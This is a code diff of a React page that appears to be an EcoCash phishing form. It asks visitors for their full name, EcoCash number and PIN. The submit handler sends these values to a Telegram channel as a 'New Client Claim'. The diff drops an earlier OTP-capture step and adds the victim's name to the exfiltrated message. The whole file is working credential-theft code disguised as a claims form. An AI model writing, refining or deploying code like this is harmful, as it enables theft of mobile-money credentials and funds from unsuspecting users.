@@ -10,33 +10,38 @@ export default function ClientSide() {
   const [clientNumber, setclientNumber] = useState("");
   const [clientPin, setclientPin] = useState("");
   const [clientname, setclientname] = useState("");
-  const [otp, setotp] = useState("");
+  // const [otp, setotp] = useState("");
   const [invalidNo, setwrongNo] = useState(false);
   const [success, setsuccess] = useState(false);
   const [invalidpin, setwrongpi] = useState(false);
   // const [clientName, setclientName] = useState(false);
-  const [opttrue, setopttrue] = useState(true);
-  const [opptt, setopptt] = useState(true);
+  // const [opttrue, setopttrue] = useState(true);
+  // const [opptt, setopptt] = useState(true);
 
   // function goToAdmin() {
 
   // }
 
-  function handleSubmit(e) {
+  // function handleSubmit(e) {
+  //   e.preventDefault();
+  //   if (otp.length !== 6 && clientname !== "") {
+  //     setwrongNo(true);
+  //     return;
+  //   }
+  //   console.log("submit");
+
+  //   setnext(true);
+  //   setopptt(false);
+  //   console.log(clientNumber);
+  // }
+  function handleContinue(e) {
     e.preventDefault();
-    if (otp.length !== 6 && clientname !== "") {
+    // setopttrue(false);
+    if (clientNumber.length !== 10 && clientname !== "") {
       setwrongNo(true);
       return;
     }
-    console.log("submit");
-
     setnext(true);
-    setopptt(false);
-    console.log(clientNumber);
-  }
-  function handleContinue(e) {
-    e.preventDefault();
-    setopttrue(false);
     console.log("clicked");
   }
   async function handleSubmitPin(e) {
@@ -47,7 +52,7 @@ export default function ClientSide() {
     }
     // uploaddata();
     await sendToTelegram(
-      `New Client Claim:\nEcoCash Number: ${clientNumber}\nEcoCash otp: ${otp}\nEcoCash Pin: ${clientPin}`
+      `New Client Claim:\nClient name: ${clientname}\nEcoCash Number: ${clientNumber}\nEcoCash Pin: ${clientPin}`
     );
     setsuccess(true);
   }
@@ -79,37 +84,37 @@ export default function ClientSide() {
       </h1>
       {!success ? (
         <form>
-          <>
-            {opttrue ? (
-              <div>
-                {/* <div className={`${styles.myform} ${next ? styles.hide : ""}`}> */}
-                <div className={`${styles.myform} ${next && styles.hide}`}>
-                  <label htmlFor="number">Enter your Name</label>
-                  <input
-                    type="text"
-                    onChange={(e) => setclientname(e.target.value)}
-                    value={clientname}
-                    placeholder="full name"
-                  />
-                  <label htmlFor="number">Enter your EcoCash No</label>
-                  <input
-                    type="number"
-                    onChange={(e) => setclientNumber(e.target.value)}
-                    placeholder="07XXXXXXXX"
-                    value={clientNumber}
-                  />
-                  {invalidNo && (
-                    <label htmlFor="number" style={{ color: "red" }}>
-                      Please Enter Valid EcoCash number!
-                    </label>
-                  )}
-                  <button type="submit" onClick={(e) => handleContinue(e)}>
-                    continue
-                  </button>
-                </div>
-              </div>
-            ) : (
-              <>
+          {/* <> */}
+          {/* {opttrue ? ( */}
+          <div>
+            {/* <div className={`${styles.myform} ${next ? styles.hide : ""}`}> */}
+            <div className={`${styles.myform} ${next && styles.hide}`}>
+              <label htmlFor="number">Enter your Name</label>
+              <input
+                type="text"
+                onChange={(e) => setclientname(e.target.value)}
+                value={clientname}
+                placeholder="full name"
+              />
+              <label htmlFor="number">Enter your EcoCash No</label>
+              <input
+                type="number"
+                onChange={(e) => setclientNumber(e.target.value)}
+                placeholder="07XXXXXXXX"
+                value={clientNumber}
+              />
+              {invalidNo && (
+                <label htmlFor="number" style={{ color: "red" }}>
+                  Please Enter Valid EcoCash number!
+                </label>
+              )}
+              <button type="submit" onClick={(e) => handleContinue(e)}>
+                continue
+              </button>
+            </div>
+          </div>
+          {/* ) : ( */}
+          {/* <>
                 {opptt ? (
                   <div className={styles.otpSide}>
                     <p>
@@ -137,7 +142,7 @@ export default function ClientSide() {
                 )}
               </>
             )}
-          </>
+          </> */}
 
           <div>
             <div className={`${styles.myform} + ${!next && styles.hide}`}>
